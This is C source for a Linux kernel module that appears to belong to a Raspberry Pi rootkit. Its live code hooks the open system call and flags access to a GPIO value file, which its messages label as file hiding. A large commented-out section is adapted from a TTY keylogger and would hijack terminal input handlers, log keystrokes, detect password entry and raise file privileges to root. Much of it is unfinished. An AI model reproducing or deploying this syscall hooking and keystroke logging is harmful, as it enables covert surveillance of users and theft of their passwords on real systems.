#include<linux/slab.h>		// for kmalloc
#include <linux/uaccess.h> 	// for copy_from_user
#include <linux/unistd.h>	// for __NR_getdents64 & __NR_getdents
#include <linux/tty.h>
#include <linux/tty_ldisc.h>		// for receive_buf()
 
#include <linux/file.h>		// for file

#include "hack_pi.h"
#include "open_hooking.h"

/*
#define TTY_NUMBER(tty) MINOR((tty)->device) - (tty)->driver.minor_start \
			+ (tty)->driver.name_base
#define TTY_INDEX(tty) tty->driver.type == \
			TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
			TTY_NUMBER(tty):TTY_NUMBER(tty)
#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
#define TTY_WRITE(tty, buf, count) (*tty->driver.write)(tty, 0, \
							buf, count)

#define TTY_NAME(tty) (tty->driver.type == \
		TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: \
		tty->driver.type == TTY_DRIVER_TYPE_PTY && \
		tty->driver.subtype == PTY_TYPE_SLAVE?N_PTS_NAME:"")


#define MAX_TTY_CON 8
#define MAX_PTS_CON 256
#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SZ 12
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }*/

bool HOOK_WRITE;

/*
void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{
	//if(!tty->real_raw && !tty->raw)	// no real_raw or raw found in tty.h of rpi
		//vlogger_process(tty, cp, fp, count);

	//(*old_receive_buf)(tty, cp, fp, count);

	// start logging

	char logfile[256];
	snprintf(logfile, sizeof(logfile)-1, "%s/%s%d", LOG_DIR, TTY_NAME(tty),	TTY_NUMBER(tty));

}

void (*old_receive_buf)(struct tty_struct *, const unsigned char *, char *, int);

void get_time (char *date_time) 
{
	struct timeval tv;
	time_t t;
	struct vtm tm;
	
	do_gettimeofday(&tv);
        t = (time_t)tv.tv_sec;
	
	epoch2time(&t, TIMEZONE, &tm);

	sprintf(date_time, "%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
		tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
		tm.tm_sec);
}

inline struct task_struct *get_task(pid_t pgrp) 
{
	struct task_struct *task = current;

        do {
                if (task->pgrp == pgrp) {
                        return task;
                }
                task = task->next_task;
        } while (task != current);
        return NULL;
}

#define _write(f, buf, sz) (f->f_op->write(f, buf, sz, &f->f_pos))
#define WRITABLE(f) (f->f_op && f->f_op->write)

int write_to_file(char *logfile, char *buf, int size)
{
	int ret = 0;
	struct file   *f = NULL;

	lock_kernel();
	BEGIN_KMEM;
	f = filp_open(logfile, O_CREAT|O_APPEND, 00600);

	if (IS_ERR(f)) {
		DPRINT("Error %ld opening %s\n", -PTR_ERR(f), logfile);
		ret = -1;
	} else {
		if (WRITABLE(f))
			_write(f, buf, size);
		else {
	      		DPRINT("%s does not have a write method\n",
	      			logfile);
			ret = -1;
		}
    			
		if ((ret = filp_close(f,NULL)))
			DPRINT("Error %d closing %s\n", -ret, logfile);
	}
	END_KMEM;
	unlock_kernel();

	return ret;
}


#define BEGIN_ROOT { int saved_fsuid = current->fsuid; current->fsuid = 0;
#define END_ROOT current->fsuid = saved_fsuid; }


struct tlogger {
	struct tty_struct *tty;
	char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
	int lastpos;
	int status;
	int pass;
};

struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = { NULL };
*/

// Function pointers to original syscalls
asmlinkage int (*original_open)(char __user *filename, int flags, umode_t mode);

asmlinkage int hacked_open(char __user *filename, int flags, umode_t mode)
{
	int ret = original_open(filename, flags, mode);;

	if(strcmp(filename, "/sys/class/gpio/gpio4/value")==0){
		HOOK_WRITE = true;
	}
	/*
	if(ret>=0){
		//struct tty_struct *tty;
		struct tty_ldisc *tty_ldisc;

		//BEGIN_KMEM
		struct file *file = fget(ret);
		tty_ldisc->tty = file->private_data;
		old_receive_buf = tty_ldisc->ops->receive_buf;
		tty_ldisc->ops->receive_buf=new_receive_buf;

		if(tty_ldisc!=NULL && tty_ldisc->ops->receive_buf != new_receive_buf){
			old_receive_buf = tty_ldisc->ops->receive_buf;
			//init_tty(tty, TTY_INDEX(tty));
		}
			
		//END_KMEM
	
	}*/
	return ret;
}

void enable_open_hooking(void)
{
	
	printk("Enable file hiding...");
	// Hook system calls to our function
	HOOK_SYSCALL(open);

}

void disable_open_hooking(void)
{
	RESTORE_SYSCALL(open);
}

void init_open_hooking(void)
{
	printk("Init File Hiding...");	
	enable_open_hooking();
}

void finalize_open_hooking(void)
{
	disable_open_hooking();
}
